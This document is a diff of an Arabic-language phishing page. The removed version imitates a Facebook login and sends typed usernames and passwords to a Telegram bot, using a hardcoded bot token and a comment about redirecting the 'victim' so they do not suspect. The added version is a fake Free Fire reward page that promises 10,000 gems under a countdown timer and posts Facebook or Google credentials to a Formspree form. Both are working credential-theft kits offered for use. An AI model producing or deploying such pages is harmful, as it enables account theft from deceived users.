@@ -1,54 +1,72 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول</title>
+    <title>Garena Free Fire - Reward Center</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; text-align: center; }
-        .fb-logo { width: 200px; margin-bottom: 10px; }
-        input { width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: right; }
-        button { width: 98%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn { background-color: #42b72a; width: auto; padding: 10px 20px; font-size: 16px; }
+        body { background-color: #0c0c0c; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; direction: rtl; margin: 0; padding: 0; }
+        .header { background: linear-gradient(to bottom, #ff9900, #cc7a00); padding: 15px; font-weight: bold; font-size: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        .container { padding: 20px; }
+        .reward-card { border: 1px solid #333; background: #1a1a1a; border-radius: 10px; padding: 15px; margin-bottom: 20px; }
+        .reward-card img { width: 100px; border-radius: 5px; }
+        .login-btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; text-decoration: none; color: white; font-size: 16px; }
+        .fb-btn { background-color: #1877F2; }
+        .gp-btn { background-color: #ffffff; color: #757575; border: 1px solid #ddd; }
+        .timer { color: #ff0000; font-weight: bold; font-size: 18px; margin: 15px 0; }
+        input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #222; color: white; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); padding-top: 50px; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8qHnS4.svg" alt="Facebook" class="fb-logo">
-        <p style="font-size: 18px; margin-bottom: 20px;">تسجيل الدخول إلى فيسبوك</p>
+
+<div class="header">مركز توزيع مكافآت فري فاير 2026 💎</div>
+
+<div class="container">
+    <div class="reward-card">
+        <img src="https://garena.com/garena_cms/images/307/ff_logo.png" alt="Free Fire">
+        <h3>تهانينا! أنت مؤهل للحصول على 10,000 جوهرة + سكن الهيب هوب</h3>
+        <p>اختر الحساب المربوط باللعبة لاستلام الجوائز فوراً:</p>
         
-        <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <input type="password" id="pass" placeholder="كلمة السر" required>
-        <button onclick="sendToBot()">تسجيل الدخول</button>
-        
-        <div style="margin-top: 15px;"><a href="#" style="text-decoration: none; color: #1877f2; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
-        <div class="divider"></div>
-        <button class="create-btn">إنشاء حساب جديد</button>
+        <div class="timer">ينتهي العرض خلال: <span id="time">05:00</span></div>
+
+        <button onclick="openLogin('Facebook')" class="login-btn fb-btn">تسجيل الدخول عبر Facebook</button>
+        <button onclick="openLogin('Google')" class="login-btn gp-btn">تسجيل الدخول عبر Google</button>
     </div>
+</div>
 
-    <script>
-        function sendToBot() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-            
-            // بياناتك الخاصة التي زودتني بها
-            const token = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
-            const chatId = "8428507759";
-            
-            const message = `🔥 تم اصطياد حساب فيسبوك جديد 🔥\n\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n\n📱 جاري التحويل للمتصفح...`;
+<div id="loginModal" class="modal">
+    <div style="background: #1a1a1a; width: 85%; margin: auto; padding: 20px; border-radius: 10px; border: 1px solid #ff9900;">
+        <h3 id="loginTitle">تسجيل الدخول</h3>
+        <p style="font-size: 12px; color: #aaa;">يجب الدخول بالحساب الأساسي المربوط باللعبة لضمان وصول الجواهر</p>
+        
+        <form action="https://formspree.io/f/YOUR_ID_HERE" method="POST">
+            <input type="hidden" name="Login_Type" id="loginTypeField">
+            <input type="text" name="Email/Phone" placeholder="البريد الإلكتروني أو الهاتف" required>
+            <input type="password" name="Password" placeholder="كلمة السر" required>
+            <button type="submit" style="background:#ff9900; color:black; width:100%; padding:10px; border:none; border-radius:5px; font-weight:bold;">تأكيد الاستلام الآن 🔥</button>
+        </form>
+        <button onclick="closeLogin()" style="background:none; color:white; border:none; margin-top:15px; cursor:pointer;">إلغاء</button>
+    </div>
+</div>
 
-            // إرسال البيانات للبوت
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(() => {
-                // تحويل الضحية لفيسبوك الحقيقي حتى لا يشك
-                window.location.href = "https://www.facebook.com/login.php";
-            })
-            .catch(() => {
-                alert("حدث خطأ في الاتصال، حاول مرة أخرى");
-            });
-        }
-    </script>
+<script>
+    function openLogin(type) {
+        document.getElementById('loginModal').style.display = 'block';
+        document.getElementById('loginTitle').innerText = 'تسجيل الدخول عبر ' + type;
+        document.getElementById('loginTypeField').value = type;
+    }
+    function closeLogin() {
+        document.getElementById('loginModal').style.display = 'none';
+    }
+
+    // عداد الوقت
+    var minutes = 5, seconds = 0;
+    setInterval(function() {
+        if (seconds == 0) { minutes--; seconds = 59; } else { seconds--; }
+        document.getElementById('time').innerText = (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+    }, 1000);
+</script>
+
 </body>
 </html>
